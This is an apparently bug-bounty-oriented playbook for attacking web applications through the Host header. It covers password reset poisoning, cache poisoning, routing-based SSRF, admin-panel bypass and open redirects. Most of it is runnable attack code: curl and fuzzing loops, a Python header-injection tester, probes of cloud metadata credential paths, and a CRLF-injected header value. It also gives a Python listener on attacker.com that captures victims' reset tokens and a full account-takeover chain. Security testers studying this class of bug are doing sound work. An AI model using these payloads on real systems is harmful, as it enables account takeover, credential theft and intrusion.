# Playbook: Host Header Attack Testing

## Purpose
Detect and exploit Host header injection vulnerabilities including password reset
poisoning, web cache poisoning, routing-based SSRF, authentication bypass, and
open redirect. These attacks abuse how web servers, reverse proxies, and application
code trust or reflect the Host header without validation.
Input: target domain, password reset endpoint, or any endpoint that uses the Host
header in its response (links, redirects, cached content).

---

## Theory — Why Host Header Attacks Work

Web servers use the `Host` header to determine which virtual host should handle the
request. Reverse proxies (nginx, HAProxy, ALB) use it for routing. Applications
use it to generate absolute URLs in emails, redirects, and cached pages.

The problem: the Host header is client-controlled. If the application trusts it
blindly for URL generation, link building, or routing decisions, an attacker can
inject arbitrary values.

Common vulnerable patterns:
- Password reset emails: `reset_link = "https://" + request.host + "/reset?token=" + token`
- Redirect URLs: `Location: https://{Host}/dashboard`
- Cache keys: proxy caches response but Host header is not part of the cache key
- Virtual host routing: `Host: admin-panel` routes to internal admin app
- Reverse proxy forwarding: proxy forwards `Host` value to backend without validation

---

## Step 1 — Baseline Host Header Behavior

```bash
TARGET="https://victim.com"

# Normal request — observe response
curl -sk -D- "$TARGET/" | head -30

# Check what headers the server reflects
curl -sk -D- -H "Host: evil.com" "$TARGET/" | head -30

# Check if the server returns 200, redirect, or error with a different Host
curl -sk -o /dev/null -w "Host: evil.com → %{http_code} (size: %{size_download})\n" \
  -H "Host: evil.com" "$TARGET/"

curl -sk -o /dev/null -w "Host: victim.com → %{http_code} (size: %{size_download})\n" \
  -H "Host: victim.com" "$TARGET/"

# Compare response bodies — does content change based on Host?
diff <(curl -sk -H "Host: victim.com" "$TARGET/") \
     <(curl -sk -H "Host: evil.com" "$TARGET/")
```

---

## Step 2 — Password Reset Poisoning

This is the highest-impact Host header attack. The goal: make the application
generate a password reset link pointing to an attacker-controlled domain.

**Attack flow:**
1. Attacker requests password reset for victim's email
2. Attacker manipulates the Host header in the reset request
3. Application generates reset link using attacker's Host value
4. Victim receives email with link: `https://attacker.com/reset?token=SECRET`
5. Victim clicks link -> token sent to attacker's server
6. Attacker uses token to reset victim's password -> full ATO

```bash
RESET_ENDPOINT="https://victim.com/forgot-password"
VICTIM_EMAIL="victim@example.com"
ATTACKER_DOMAIN="attacker.com"
CALLBACK="your-id.oast.fun"   # interactsh or Burp Collaborator

# --- Technique 1: Direct Host header override ---
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: ${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 2: X-Forwarded-Host (most common bypass) ---
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: victim.com" \
  -H "X-Forwarded-Host: ${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 3: X-Host header ---
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: victim.com" \
  -H "X-Host: ${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 4: X-Original-URL / X-Rewrite-URL ---
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: victim.com" \
  -H "X-Original-URL: https://${ATTACKER_DOMAIN}/forgot-password" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 5: Forwarded header (RFC 7239) ---
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: victim.com" \
  -H "Forwarded: host=${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 6: X-Forwarded-Server ---
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: victim.com" \
  -H "X-Forwarded-Server: ${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 7: Double Host header ---
# Some parsers take the first, some take the last
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: victim.com" \
  -H "Host: ${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 8: Port-based injection ---
# Application may only validate hostname, not port
curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: victim.com:@${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

curl -sk -X POST "$RESET_ENDPOINT" \
  -H "Host: victim.com:${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 9: Space/tab injection in Host ---
curl -sk -X POST "$RESET_ENDPOINT" \
  -H $'Host: victim.com\r\nX-Injected: header' \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 10: Absolute URL in request line ---
# HTTP/1.1 allows absolute URI in request line; Host header becomes secondary
curl -sk --request-target "https://victim.com/forgot-password" \
  -X POST "https://victim.com/forgot-password" \
  -H "Host: ${ATTACKER_DOMAIN}" \
  -d "email=${VICTIM_EMAIL}"

# --- Technique 11: Using OOB callback for blind detection ---
# Replace attacker domain with callback to detect if the link is generated
for header in "Host" "X-Forwarded-Host" "X-Host" "X-Forwarded-Server" "Forwarded"; do
  echo "[*] Testing header: $header"
  if [ "$header" = "Forwarded" ]; then
    curl -sk -X POST "$RESET_ENDPOINT" \
      -H "Host: victim.com" \
      -H "${header}: host=${CALLBACK}" \
      -d "email=${VICTIM_EMAIL}"
  elif [ "$header" = "Host" ]; then
    curl -sk -X POST "$RESET_ENDPOINT" \
      -H "${header}: ${CALLBACK}" \
      -d "email=${VICTIM_EMAIL}"
  else
    curl -sk -X POST "$RESET_ENDPOINT" \
      -H "Host: victim.com" \
      -H "${header}: ${CALLBACK}" \
      -d "email=${VICTIM_EMAIL}"
  fi
done
# Check interactsh/Collaborator for incoming HTTP requests with tokens
```

---

## Step 3 — Web Cache Poisoning via Host Header

If a caching layer (CDN, Varnish, nginx cache) does not include the Host header
in the cache key, an attacker can poison cached responses for all users.

```bash
TARGET="https://victim.com"
ATTACKER="attacker.com"

# Step A: Check for caching indicators
curl -sk -D- "$TARGET/" | grep -iE "(x-cache|cf-cache|age:|via:|x-varnish|x-served)"

# Step B: Poison attempt — inject Host into cached page
# If the page renders Host-dependent content (meta tags, script src, links)
curl -sk -H "Host: ${ATTACKER}" "$TARGET/" | grep -i "${ATTACKER}"

# Step C: Verify poison stuck in cache
# Send normal request and check if attacker content appears
curl -sk "$TARGET/" | grep -i "${ATTACKER}"

# Step D: X-Forwarded-Host cache poisoning
curl -sk -H "X-Forwarded-Host: ${ATTACKER}" "$TARGET/" | grep -i "${ATTACKER}"
# Wait, then check:
curl -sk "$TARGET/" | grep -i "${ATTACKER}"

# Step E: Look for Host value in specific response elements
# These are common places where Host leaks into HTML:
curl -sk -H "X-Forwarded-Host: ${ATTACKER}" "$TARGET/" \
  | grep -iE "(href=|src=|action=|content=|url\()" | grep -i "${ATTACKER}"

# Poisoned elements to look for:
# - <link rel="canonical" href="https://attacker.com/...">
# - <meta property="og:url" content="https://attacker.com/...">
# - <script src="https://attacker.com/assets/app.js">
# - <base href="https://attacker.com/">
# - Inline JSON with hostname: {"baseUrl":"https://attacker.com"}
```

---

## Step 4 — SSRF via Host Header (Routing-Based)

When a reverse proxy uses the Host header to route requests to backend services,
manipulating it can reach internal services.

```bash
TARGET="https://victim.com"
CALLBACK="your-id.oast.fun"

# --- Route to internal services ---
INTERNAL_HOSTS=(
  "localhost"
  "127.0.0.1"
  "admin"
  "admin.internal"
  "backend"
  "api.internal"
  "staging"
  "dev"
  "monitoring"
  "grafana"
  "kibana"
  "jenkins"
  "consul"
  "vault"
  "kubernetes.default"
  "metadata.google.internal"
  "169.254.169.254"
)

for host in "${INTERNAL_HOSTS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Host: $host" "$TARGET/")
  size=$(curl -sk -o /dev/null -w "%{size_download}" -H "Host: $host" "$TARGET/")
  echo "Host: $host -> HTTP $code (size: $size)"
done

# --- Cloud metadata via Host header SSRF ---
# AWS
curl -sk -H "Host: 169.254.169.254" "$TARGET/latest/meta-data/"
curl -sk -H "Host: 169.254.169.254" "$TARGET/latest/meta-data/iam/security-credentials/"

# GCP
curl -sk -H "Host: metadata.google.internal" \
  -H "Metadata-Flavor: Google" \
  "$TARGET/computeMetadata/v1/"

# --- OOB detection for blind routing SSRF ---
curl -sk -H "Host: ${CALLBACK}" "$TARGET/"
# Check callback listener for incoming requests

# --- Internal port scan via Host ---
for port in 80 443 8080 8443 3000 4000 5000 8000 9090 9200; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Host: localhost:$port" "$TARGET/")
  [ "$code" != "000" ] && echo "Port $port -> HTTP $code"
done
```

---

## Step 5 — Authentication Bypass via Host Header

Some applications restrict access to admin panels based on the Host header
or virtual host routing (e.g., `admin.victim.internal` only accessible internally).

```bash
TARGET="https://victim.com"

# --- Virtual host discovery for admin panels ---
VHOSTS=(
  "admin.victim.com"
  "admin"
  "administrator"
  "manager"
  "internal"
  "intranet"
  "staging.victim.com"
  "dev.victim.com"
  "test.victim.com"
  "api-internal.victim.com"
  "debug.victim.com"
  "status.victim.com"
  "backoffice.victim.com"
)

for vhost in "${VHOSTS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Host: $vhost" "$TARGET/")
  size=$(curl -sk -o /dev/null -w "%{size_download}" -H "Host: $vhost" "$TARGET/")
  echo "Host: $vhost -> HTTP $code (size: $size)"
done | sort -t: -k4 -u   # unique by response code to spot different apps

# --- Host-based access control bypass ---
# If /admin returns 403, try with internal Host header
curl -sk -D- -H "Host: localhost" "$TARGET/admin"
curl -sk -D- -H "Host: 127.0.0.1" "$TARGET/admin"
curl -sk -D- -H "X-Forwarded-Host: localhost" "$TARGET/admin"
curl -sk -D- -H "X-Original-URL: /admin" "$TARGET/"

# --- Combine with X-Forwarded-For for IP + Host bypass ---
curl -sk -D- \
  -H "Host: admin.victim.internal" \
  -H "X-Forwarded-For: 127.0.0.1" \
  "$TARGET/admin"
```

---

## Step 6 — Open Redirect via Host Header

If the application builds redirect URLs using the Host header:

```bash
TARGET="https://victim.com"
ATTACKER="attacker.com"

# Test redirects that use Host header
curl -sk -D- -H "Host: ${ATTACKER}" "$TARGET/login" | grep -i "location:"
curl -sk -D- -H "Host: ${ATTACKER}" "$TARGET/logout" | grep -i "location:"
curl -sk -D- -H "Host: ${ATTACKER}" "$TARGET/" | grep -i "location:"

# Common redirect endpoints
REDIRECT_PATHS=(
  "/login"
  "/logout"
  "/signup"
  "/register"
  "/redirect"
  "/sso/login"
  "/oauth/authorize"
  "/auth/callback"
  "/.well-known/change-password"
)

for path in "${REDIRECT_PATHS[@]}"; do
  location=$(curl -sk -D- -H "Host: ${ATTACKER}" "$TARGET${path}" \
    | grep -i "^location:" | head -1)
  [ -n "$location" ] && echo "${path} -> ${location}"
done

# X-Forwarded-Host redirect
for path in "${REDIRECT_PATHS[@]}"; do
  location=$(curl -sk -D- -H "X-Forwarded-Host: ${ATTACKER}" "$TARGET${path}" \
    | grep -i "^location:" | head -1)
  [ -n "$location" ] && echo "[XFH] ${path} -> ${location}"
done
```

---

## Step 7 — Full ATO Chain (Password Reset Poisoning)

Step-by-step account takeover chain when password reset poisoning works:

```
ATTACK CHAIN:
=============

1. Attacker identifies password reset endpoint accepts Host header manipulation
   curl -X POST https://victim.com/forgot-password \
     -H "X-Forwarded-Host: attacker.com" \
     -d "email=victim@example.com"

2. Victim receives email with poisoned reset link:
   "Click here to reset your password:
    https://attacker.com/reset?token=a1b2c3d4e5f6..."

3. Attacker sets up web server to capture tokens:
   # On attacker.com
   python3 -c "
   from http.server import HTTPServer, BaseHTTPRequestHandler
   import urllib.parse
   class Handler(BaseHTTPRequestHandler):
       def do_GET(self):
           query = urllib.parse.urlparse(self.path).query
           params = urllib.parse.parse_qs(query)
           if 'token' in params:
               print(f'[CAPTURED] Token: {params[\"token\"][0]}')
               with open('tokens.txt', 'a') as f:
                   f.write(f'{params[\"token\"][0]}\n')
           self.send_response(302)
           self.send_header('Location', 'https://victim.com/')
           self.end_headers()
   HTTPServer(('0.0.0.0', 443), Handler).serve_forever()
   "

4. When victim clicks the link, token is captured. Attacker uses it:
   curl -sk -X POST "https://victim.com/reset-password" \
     -d "token=a1b2c3d4e5f6&new_password=attacker_password123"

5. Attacker logs in as victim:
   curl -sk -X POST "https://victim.com/login" \
     -d "email=victim@example.com&password=attacker_password123"

RESULT: Full account takeover
SEVERITY: CRITICAL (P1)
```

---

## Step 8 — Automated Header Fuzzing

```bash
TARGET="https://victim.com"
RESET_EP="$TARGET/forgot-password"
CALLBACK="your-id.oast.fun"
EMAIL="test@example.com"

# Fuzz all known host-override headers at once
HEADERS=(
  "Host: ${CALLBACK}"
  "X-Forwarded-Host: ${CALLBACK}"
  "X-Host: ${CALLBACK}"
  "X-Forwarded-Server: ${CALLBACK}"
  "X-HTTP-Host-Override: ${CALLBACK}"
  "X-Original-URL: https://${CALLBACK}/"
  "X-Rewrite-URL: https://${CALLBACK}/"
  "Forwarded: host=${CALLBACK}"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "X-Forwarded-Port: 443\r\nHost: ${CALLBACK}"
  "X-ProxyUser-Ip: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
)

for h in "${HEADERS[@]}"; do
  header_name=$(echo "$h" | cut -d: -f1)
  echo "[*] Testing: $header_name"
  curl -sk -X POST "$RESET_EP" \
    -H "Host: victim.com" \
    -H "$h" \
    -d "email=${EMAIL}" \
    -o /dev/null -w "  -> HTTP %{http_code}\n"
done
# Monitor callback for any incoming requests
```

---

## Step 9 — Burp Suite Integration

```
Manual testing in Burp:
-----------------------

1. PARAM MINER (automated host header scanning):
   - Right-click request -> Extensions -> Param Miner -> Guess Headers
   - Param Miner will automatically test Host override headers
   - Look for "Issue found" in Extender output

2. COLLABORATOR-BASED TESTING:
   - Capture password reset request in Repeater
   - Replace Host with your Collaborator domain
   - Send and check Collaborator tab for callbacks
   - Also test: X-Forwarded-Host, Forwarded, X-Host

3. TURBO INTRUDER (for cache poisoning):
   - Send request to Turbo Intruder
   - Script: send poisoned request, then immediately send clean
     request to verify cache was poisoned
   - Monitor for cache hits with poisoned content

4. MATCH AND REPLACE RULES:
   - Proxy -> Options -> Match and Replace
   - Add rule: Replace "Host: victim.com" with "Host: collaborator.net"
   - Browse normally and watch for callbacks

5. ACTIVE SCAN:
   - Burp Scanner detects some Host header issues automatically
   - Check "Host header injection" in scan results
```

---

## Step 10 — Tools Reference

```bash
# --- param-miner (Burp extension) ---
# Best automated tool for Host header testing
# Install: BApp Store -> Param Miner
# Usage: Right-click -> Extensions -> Param Miner -> Guess Headers

# --- interactsh (OOB callback) ---
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -v

# --- nuclei (Host header templates) ---
nuclei -u "https://victim.com" -tags host-header
nuclei -u "https://victim.com" -t http/vulnerabilities/host-header-injection.yaml

# --- Custom Python script for batch testing ---
cat << 'PYEOF' > host_header_test.py
#!/usr/bin/env python3
"""Host header injection tester for password reset endpoints."""

import requests
import sys
import urllib3
urllib3.disable_warnings()

TARGET = sys.argv[1]       # https://victim.com/forgot-password
EMAIL = sys.argv[2]        # victim@example.com
CALLBACK = sys.argv[3]     # your-id.oast.fun

PAYLOADS = [
    {"Host": CALLBACK},
    {"X-Forwarded-Host": CALLBACK},
    {"X-Host": CALLBACK},
    {"X-Forwarded-Server": CALLBACK},
    {"X-HTTP-Host-Override": CALLBACK},
    {"Forwarded": f"host={CALLBACK}"},
    {"X-Original-URL": f"https://{CALLBACK}/"},
    {"X-Rewrite-URL": f"https://{CALLBACK}/"},
]

for payload in PAYLOADS:
    header_name = list(payload.keys())[0]
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    headers.update(payload)
    try:
        r = requests.post(
            TARGET,
            data={"email": EMAIL},
            headers=headers,
            verify=False,
            allow_redirects=False,
            timeout=10,
        )
        status = r.status_code
        has_callback = CALLBACK in r.text
        print(f"[{'!' if has_callback else ' '}] {header_name:30s} -> {status}"
              f"{' [REFLECTED IN BODY]' if has_callback else ''}")
    except Exception as e:
        print(f"[E] {header_name:30s} -> {e}")
PYEOF

# Usage:
# python3 host_header_test.py https://victim.com/forgot-password victim@example.com your-id.oast.fun

# --- ffuf for virtual host brute-forcing ---
ffuf -u "https://TARGET/" -H "Host: FUZZ.TARGET" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc all -fc 302 -fs 0
```

---

## Step 11 — Real-World Examples

```
1. GitLab Password Reset Poisoning (CVE-2023-7028)
   - CVSS: 10.0 (Critical)
   - Sending password reset with manipulated Host header caused
     reset token to be sent to attacker-controlled URL
   - Affected all self-managed GitLab instances
   - Attack: POST /users/password with Host: attacker.com

2. Django Password Reset Poisoning (CVE-2016-9014)
   - Django used the Host header to build password reset URLs
   - ALLOWED_HOSTS misconfigured or DEBUG=True -> exploitable
   - Fixed by validating Host against ALLOWED_HOSTS

3. Symfony Host Header Injection
   - Symfony's Request::getHost() trusted X-Forwarded-Host by default
   - Password reset, email verification, and canonical URLs poisoned

4. WordPress Password Reset (ticket #25239)
   - wp-login.php?action=lostpassword reflected Host in reset link
   - SERVER_NAME vs HTTP_HOST confusion in Apache

5. HackerOne Reports (public):
   - #226659: Host Header Injection leading to password reset poisoning
   - #698416: Host Header Injection in password reset on vendor platform
   - #167631: Password reset token leak via Host header to third-party

6. Common Bugcrowd/HackerOne findings pattern:
   - P2-P1 severity depending on whether ATO chain is demonstrable
   - Password reset poisoning -> P1 if full ATO chain proven
   - Cache poisoning -> P2 if XSS achievable
   - Open redirect via Host -> P3-P4
   - Information disclosure (Host reflected in page) -> P4
```

---

## Output

```
ENDPOINT      : POST /forgot-password
HEADER USED   : X-Forwarded-Host: attacker.com
ATTACK TYPE   : Password Reset Poisoning
RESULT        : Reset email contains link with attacker-controlled domain
                Token captured when victim clicks link
SEVERITY      : CRITICAL — full account takeover chain
IMPACT        : Any user account can be taken over by poisoning their
                password reset link and capturing the reset token
EVIDENCE      : [reset email screenshot + captured token + successful password change]
BYPASS USED   : X-Forwarded-Host (direct Host blocked by reverse proxy)
NEXT STEPS    : Load 03_reporting/severity_scorer.md + report_writer.md
                Demonstrate full ATO chain in PoC for maximum bounty
```

---

## Severity Guide

| Attack                                  | Typical Severity | Bounty Range |
|-----------------------------------------|------------------|--------------|
| Password reset poisoning -> ATO         | CRITICAL (P1)    | $2,000-15,000+ |
| Web cache poisoning -> stored XSS       | HIGH (P2)        | $1,000-5,000   |
| Routing-based SSRF -> internal access   | HIGH (P2)        | $1,000-5,000   |
| Auth bypass -> admin panel access       | HIGH-CRIT (P1-2) | $2,000-10,000  |
| Open redirect via Host                  | LOW (P4)         | $100-500       |
| Host reflected in page (no impact)      | INFO (P5)        | N/A            |
